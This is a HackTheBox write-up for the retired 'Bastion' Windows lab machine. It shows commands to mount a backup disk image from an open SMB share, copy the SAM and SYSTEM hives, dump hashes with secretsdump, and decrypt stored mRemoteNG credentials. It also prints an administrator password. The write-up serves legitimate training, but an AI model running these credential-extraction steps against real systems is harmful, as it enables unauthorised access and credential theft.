---
layout: default
title : muzec - Bastion Writeup
---

![image](https://user-images.githubusercontent.com/69868171/124597791-ca28e500-de5b-11eb-84d7-75a5f667876b.png)

We always start with an nmap scan.....

```Nmap -sC -sV -oA nmap <Target-IP>```

```
# Nmap 7.91 scan initiated Mon Jul  5 10:55:33 2021 as: nmap -sC -sV -oA nmap 10.10.10.134
Nmap scan report for 10.10.10.134
Host is up (0.46s latency).
Not shown: 996 closed ports
PORT    STATE SERVICE      VERSION
22/tcp  open  ssh          OpenSSH for_Windows_7.9 (protocol 2.0)
| ssh-hostkey: 
|   2048 3a:56:ae:75:3c:78:0e:c8:56:4d:cb:1c:22:bf:45:8a (RSA)
|   256 cc:2e:56:ab:19:97:d5:bb:03:fb:82:cd:63:da:68:01 (ECDSA)
|_  256 93:5f:5d:aa:ca:9f:53:e7:f2:82:e6:64:a8:a3:a0:18 (ED25519)
135/tcp open  msrpc        Microsoft Windows RPC
139/tcp open  netbios-ssn  Microsoft Windows netbios-ssn
445/tcp open  microsoft-ds Windows Server 2016 Standard 14393 microsoft-ds
Service Info: OSs: Windows, Windows Server 2008 R2 - 2012; CPE: cpe:/o:microsoft:windows

Host script results:
|_clock-skew: mean: 2h20m57s, deviation: 1h09m13s, median: 3h00m54s
| smb-os-discovery: 
|   OS: Windows Server 2016 Standard 14393 (Windows Server 2016 Standard 6.3)
|   Computer name: Bastion
|   NetBIOS computer name: BASTION\x00
|   Workgroup: WORKGROUP\x00
|_  System time: 2021-07-05T14:57:52+02:00
| smb-security-mode: 
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
| smb2-security-mode: 
|   2.02: 
|_    Message signing enabled but not required
| smb2-time: 
|   date: 2021-07-05T12:57:48
|_  start_date: 2021-07-05T04:32:51

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Mon Jul  5 10:57:10 2021 -- 1 IP address (1 host up) scanned in 97.46 seconds
```

My second windows box on HackTheBox and would actually say am loving it so we are having some ports let start on eumerating SMB for some anonymous log shares.

```
                                                                                                                                                                       
┌──(muzec㉿Muzec-Security)-[~/Documents/HTB/retired/10.10.10.134]
└─$ smbclient -L //10.10.10.134/ -N         

        Sharename       Type      Comment
        ---------       ----      -------
        ADMIN$          Disk      Remote Admin
        Backups         Disk      
        C$              Disk      Default share
        IPC$            IPC       Remote IPC
SMB1 disabled -- no workgroup available
```

Seems we have access to the backups share on SMB let connect to it.

![image](https://user-images.githubusercontent.com/69868171/124598438-8387ba80-de5c-11eb-9259-145762eca73c.png)

We are in cool let get the `note.txt` first maybe we are left with a hint to keep going forward and we still have some juciy directories to check lol.

```
                                                                                                                                                                       
┌──(muzec㉿Muzec-Security)-[~/Documents/HTB/retired/10.10.10.134]
└─$ cat note.txt     
Sysadmins: please don't transfer the entire backup file locally, the VPN to the subsidiary office is too slow.
```

Cool? let try to check what the system admin was talking about so let enumerate the directories.

`\\10.10.10.134\Backups\WindowsImageBackup\L4mpje-PC\Backup 2019-02-22 124351\`

![image](https://user-images.githubusercontent.com/69868171/124598938-11fc3c00-de5d-11eb-9be8-8efd5d76ed76.png)

Ok we have some cool files also a Virtual Hard Disk Image but the problem am facing is that it always disconnect when i try to get the file i think that what the system admin was talking about.

![image](https://user-images.githubusercontent.com/69868171/124599290-6bfd0180-de5d-11eb-96ad-26ea770a7742.png)

With some little research i was able to find a way to mount it on my Kali machine.

### Mounting A VHD On Linux

First step is to install the tool `sudo apt install libguestfs-tools -y`

```
sudo mount -t cifs //10.10.10.134/backups /mnt -o user=,password=
```

![image](https://user-images.githubusercontent.com/69868171/124599859-107f4380-de5e-11eb-85fe-beb468d8af6f.png)

![image](https://user-images.githubusercontent.com/69868171/124600087-46bcc300-de5e-11eb-8c8e-9c4b4d18c684.png)

So we have it mounted already cool. Now we need a directory that we need to use to mount the VHD file.

```
sudo mkdir /mnt/Vhd
```

Now we are going to use guestmount to mount the directory in read-only `ro` mode, and, use it with the folder we created `/mnt/vhd` .

```
sudo guestmount --add 9b9cfbc4-369e-11e9-a17c-806e6f6e6963.vhd --inspector --ro -v /mnt/vhd
```

![image](https://user-images.githubusercontent.com/69868171/124601024-47098e00-de5f-11eb-9579-062f3d6e06f7.png)

It going to take sometime so we have to wait for it to be done maybe grab a cup of coffee.

```
sudo su
cd /mnt/vhd
```

![image](https://user-images.githubusercontent.com/69868171/124603735-28f15d00-de62-11eb-8cff-2328add0b0a5.png)

Now we can try to check for interesting directories and files like dumping SAM database.

### How To Extract Local SAM Database From VHD Files

Since we have mount the VHD on our Kali machine we can go ahead and dump SAM database that store credentials.

```
cd /Windows/System32/config
cp SAM SYSTEM /tmp
```
![image](https://user-images.githubusercontent.com/69868171/124605208-9487fa00-de63-11eb-85a0-e01f83259aaa.png)

NOTE:- We can also grab nts.dit if we are on a domain controller so we can crack all of the AD hashes.

Now let change to the `tmp` directory.

```
cd /tmp
impacket-secretsdump -sam SAM -system SYSTEM local
```

![image](https://user-images.githubusercontent.com/69868171/124605805-34458800-de64-11eb-84a1-a5d1551a3d13.png)

Now that we have the hashes let try to crack it.

![image](https://user-images.githubusercontent.com/69868171/124606020-65be5380-de64-11eb-854f-6ae2a4bf5ea1.png)

So i was able to crack `L4mpje` password hash now since we have SSH open let try it.

![image](https://user-images.githubusercontent.com/69868171/124606572-eda45d80-de64-11eb-9b42-f79221f6587c.png)

We are in now let get `user.txt` .

![image](https://user-images.githubusercontent.com/69868171/124607567-e29dfd00-de65-11eb-8c69-2505b7c40d30.png)

### SYSTEM / ADMINISTRATOR

Time to get system i really have a tough time here since i know nothing about windows so i just peep at write up to know what am missing so that get me back on a track.

![image](https://user-images.githubusercontent.com/69868171/124623819-3a436500-de74-11eb-8773-60d8cf0f95bd.png)

When I checked the user appdata I saw that mRemoteNG was installed on the box so i quickly google search about it.

mRemoteNG is a fork of mRemote: an open source, tabbed, multi-protocol, remote connections manager. mRemoteNG adds bug fixes and new features to mRemote.

It allows you to view all of your remote connections in a simple yet powerful tabbed interface.

mRemoteNG saves the connections info and credentials in a file called `confCons.xml` 

![image](https://user-images.githubusercontent.com/69868171/124624448-c8b7e680-de74-11eb-9e44-4b39c64718b3.png)

![image](https://user-images.githubusercontent.com/69868171/124624523-da00f300-de74-11eb-9b2a-4a571a62cb94.png)

Now we have administrator password but it encrypted let find a way to decrypt it.

```
git clone https://github.com/haseebT/mRemoteNG-Decrypt.git
```

![image](https://user-images.githubusercontent.com/69868171/124625060-5f84a300-de75-11eb-87f4-8df52793b5d1.png)

```
python3 mremoteng_decrypt.py -s 
```

![image](https://user-images.githubusercontent.com/69868171/124625148-79be8100-de75-11eb-8fca-4ed5326f3428.png)

```
Username:- administrator
Password:- thXLHM96BeKL0ER2
```
Now we have credentials for administrator let hit SSH to get the root flag.

![image](https://user-images.githubusercontent.com/69868171/124625591-d6ba3700-de75-11eb-99de-63595e091a59.png)

We are done. 

Greeting From [Muzec](https://twitter.com/muzec_saminu)

<br> <br>
[Back To Home](../index.md)
<br>
